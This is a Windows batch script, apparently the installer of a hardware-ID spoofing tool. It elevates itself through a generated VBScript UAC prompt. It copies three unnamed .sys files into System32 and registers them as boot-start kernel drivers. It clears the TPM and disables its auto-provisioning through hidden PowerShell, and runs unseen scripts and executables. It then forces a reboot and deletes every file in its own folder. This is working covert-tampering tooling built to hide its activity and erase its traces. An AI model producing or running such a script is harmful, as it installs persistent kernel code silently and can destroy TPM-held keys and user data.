@echo off
setlocal

openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
set "system32Dir=C:\Windows\System32\"
if exist "%~dp0winapix64.sys" (
    copy /y "%~dp0winapix64.sys" "%system32Dir%" >nul 2>&1
)
set "system32Dir=C:\Windows\System32\"
if exist "%~dp0winverred.sys" (
    copy /y "%~dp0winverred.sys" "%system32Dir%" >nul 2>&1
)
if exist "%~dp0winverseri.sys" (
    copy /y "%~dp0winverseri.sys" "%system32Dir%" >nul 2>&1
)

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Clear-Tpm'"

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%2.ps1\"'"


:: Set your service name here
set ServiceName=winapix64

:: Driver file path relative to system root
set DriverPath=System32\winapix64.sys

:: Create registry key for the service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /f >nul 2>&1

:: Set ImagePath (driver file)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPath%" /f >nul 2>&1

:: Set Type = 1 (Kernel Driver) 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Type /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Start = 0 (Boot start)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Start /t REG_DWORD /d 0 /f >nul 2>&1

:: Set ErrorControl = 1 (Normal)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ErrorControl /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Group = Boot Bus Extender (optional for early load)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Group /t REG_SZ /d "Boot Bus Extender" /f >nul 2>&1


:: Set your service name here
set ServiceNamee=winverred

:: Driver file path relative to system root
set DriverPathh=System32\winverred.sys

:: Create registry key for the service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /f >nul 2>&1

:: Set ImagePath (driver file)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPathh%" /f >nul 2>&1

:: Set Type = 1 (Kernel Driver)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Type /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Start = 0 (Boot start)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Start /t REG_DWORD /d 0 /f >nul 2>&1

:: Set ErrorControl = 1 (Normal)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ErrorControl /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Group = Boot Bus Extender (optional for early load)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Group /t REG_SZ /d "Boot Bus Extender" /f >nul 2>&1

set ServiceNameee=winverseri

:: Driver file path relative to system root
set DriverPathhh=System32\winverseri.sys

:: Create registry key for the service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /f

:: Set ImagePath (driver file)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPathhh%" /f >nul 2>&1

:: Set Type = 1 (Kernel Driver)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /v Type /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Start = 0 (Boot start)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /v Start /t REG_DWORD /d 0 /f >nul 2>&1

:: Set ErrorControl = 1 (Normal)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /v ErrorControl /t REG_DWORD /d 1 /f >nul 2>&1

:: Set Group = Boot Bus Extender (optional for early load)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNameee%" /v Group /t REG_SZ /d "Boot Bus Extender" /f >nul 2>&1

cd /d "%~dp0"

start "" disk.vbs 2>&1
start "" mac.exe 2>&1
start "" reg.vbs 2>&1
start "" vid.exe 2>&1
endlocal
timeout /t 2 /nobreak 2>&1
C:\Windows\system32\cmd.exe /c shutdown /r /t 1

cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"
exit
